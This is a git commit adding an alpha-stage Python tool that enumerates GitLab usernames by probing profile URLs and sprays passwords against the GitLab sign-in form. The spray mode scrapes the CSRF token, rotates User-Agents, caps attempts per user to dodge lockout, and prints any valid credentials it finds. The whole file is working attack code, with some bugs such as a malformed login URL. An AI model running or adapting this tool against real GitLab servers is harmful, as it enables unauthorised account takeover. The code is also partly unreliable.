b5e74bf62db181d0a78d799d1f204b43cf638524
0xyngtg <0xyngtg@kali>
2025-04-21 17:33:01 -0200

    Alpha Version v1 - Needs tests and optimization

---
+++ gitlab_userenum.py
@@ -0,0 +1,243 @@
+#!/usr/bin/python3
+
+import argparse
+import requests
+from bs4 import BeautifulSoup
+
+#0. Argparse (--proxy | -t | -v | -A )
+#0.1. Argparse enum(-h | -U)
+#0.2. Argparse spray(-h | -U/-u | -p/-P | -c | ???-w(threshold))
+#Spray (-c )
+
+def main():
+    parser = argparse.ArgumentParser(
+        description = '',
+        add_help = True,
+        prefix_chars = '-'
+    )
+    subparsers = parser.add_subparsers(dest = 'command')
+    enum_parser = subparsers.add_parser('enum', help = '')
+    enum_parser.add_argument(
+        '-U',
+        help = '',
+        metavar = '',
+        required = True
+    )
+    enum_parser.add_argument(
+        '--proxy',
+        help = '',
+        metavar = ''
+    )
+    enum_parser.add_argument(
+        '-A',
+        help = '',
+        metavar = ''
+    )
+    enum_parser.add_argument(
+        '-t',
+        help = '',
+        metavar = '',
+        required = True,
+        type = str
+    )
+    enum_parser.add_argument(
+        '-v',
+        help = '',
+        action = 'store_true',
+        default = False
+    )
+
+    spray_parser = subparsers.add_parser('spray', help = '')
+    usergroup = spray_parser.add_mutually_exclusive_group(required = True)
+    usergroup.add_argument(
+        '-U',
+        help = '',
+        metavar = ''
+    )
+    usergroup.add_argument(
+        '-u',
+        help = '',
+        metavar = ''
+    )
+    passgroup = spray_parser.add_mutually_exclusive_group(required = True)
+    passgroup.add_argument(
+        '-P',
+        help = '',
+        metavar = ''
+    )
+    passgroup.add_argument(
+        '-p',
+        help = '',
+        metavar = ''
+    )
+    spray_parser.add_argument(
+        '-c',
+        action = 'store_true',
+        default = False
+    )
+    spray_parser.add_argument(
+        '-w',
+        type = int,
+        help = '',
+        metavar = ''
+    )
+    spray_parser.add_argument(
+        '--proxy',
+        help = '',
+        metavar = ''
+    )
+    spray_parser.add_argument(
+        '-A',
+        help = '',
+        metavar = ''
+    )
+    spray_parser.add_argument(
+        '-t',
+        help = '',
+        metavar = '',
+        required = True,
+        type = str
+    )
+    spray_parser.add_argument(
+        '-v',
+        help = '',
+        action = 'store_true',
+        default = False
+    )
+    args = parser.parse_args()
+    
+    proxies = {}
+    if args.proxy:
+        proxies = {
+            'http': args.proxy,
+            'https': args.proxy
+            }
+    headers = {'Connection': 'Close'}
+    if args.A:
+        headers.update({'User-Agent': args.A})
+    target = args.t
+
+    def get_token(target, headers):
+        session = requests.session()
+        cookies = session.cookies
+        login_url = f'{target}/users/sign_in'
+        
+        resp = session.get(login_url, headers=headers)
+        soup = BeautifulSoup(resp.text, 'html.parser')
+
+        token = soup.find('input', {'name': 'authenticity_token'})['value']
+
+        if args.v:
+            print(f'[*]Getting Authenticity Token: {token}')
+            #print(cookies)
+        session.close()
+        return token, cookies
+
+    #ENUM MODE
+    if args.command == 'enum':
+        print('[!]Enum Mode Activated!')
+        
+        with open(args.U, 'r') as w:
+            for i in w:
+                target = args.t
+                user = str(i).strip()
+                if target[-1] == '/':
+                    target = f'{target}{user}'
+                else:
+                    target = f'{target}/{user}'
+                r = requests.head(target, proxies=proxies, headers=headers)
+                if args.v:
+                    print(f'[*]Testing {user}')
+                if r.status_code == 200:
+                    print(f'[+]Valid User Found: {user}')
+                elif r.status_code == 0:
+                    print('[-]Target is unreachable. Check the target provided!')
+    
+    #SPRAY MODE
+    elif args.command == 'spray':
+        print('[!]Spray Mode Activated!')
+        if target[-1] == '/':
+            login_url = f'{target}users/sign_in'
+        else:
+            login_url = f'/{target}/users/sign_in'
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Referer': login_url
+        }
+
+        useragent_wordlist = []
+        if args.A:
+            with open(args.A, 'r') as w:
+                for i in w:
+                    useragent_wordlist.append(str(i).strip())
+        username_wordlist = []
+        if args.u:
+            username_wordlist.append(str(args.u))
+        elif args.U:
+            with open(args.U, 'r') as w:
+                for i in w:
+                    username_wordlist.append(str(i).strip())
+        password_wordlist = []
+        if args.p:
+            password_wordlist.append(str(args.p))
+        elif args.P:
+            with open(args.P, 'r') as w:
+                for i in w:
+                    password_wordlist.append(str(i).strip())
+
+        k = 0
+        w = 1
+        for username in username_wordlist:
+            c = 0
+            token, cookies = get_token(target, headers)
+            if args.A:
+                headers.update({'User-Agent': useragent_wordlist[k]})
+            k += 1
+            for password in password_wordlist:
+                w += 1
+                c += 1
+                if args.v:
+                    print(f'[*]{username}\'s Lockout Count = {c}')
+                    print(f'[*]Testing {username}:{password}')
+                payload = {
+                    'utf8': "✓",
+                    'authenticity_token': token,
+                    'user[login]': username,
+                    'user[password]': password,
+                    'user[remember_me]': '0'
+                }
+                #print(payload)
+                r = requests.post(login_url, headers=headers,proxies=proxies, data=payload, cookies=cookies, allow_redirects=False)
+                #print(headers, cookies)
+                if r.status_code == 302 and "Invalid Login or password." not in r.text:
+                    print(f'[+]VALID CREDENTIALS FOUND - {username}:{password}')
+                    exit()
+                else:
+                    if args.v:
+                        #print(r.status_code, r.headers)
+                        print(f'Invalid Login - {username}:{password}')
+                if c == args.w:
+                    break
+
+
+
+
+
+        
+            
+
+        
+
+
+
+
+    
+
+
+
+
+
+
+
+if __name__ == '__main__':
+    main()
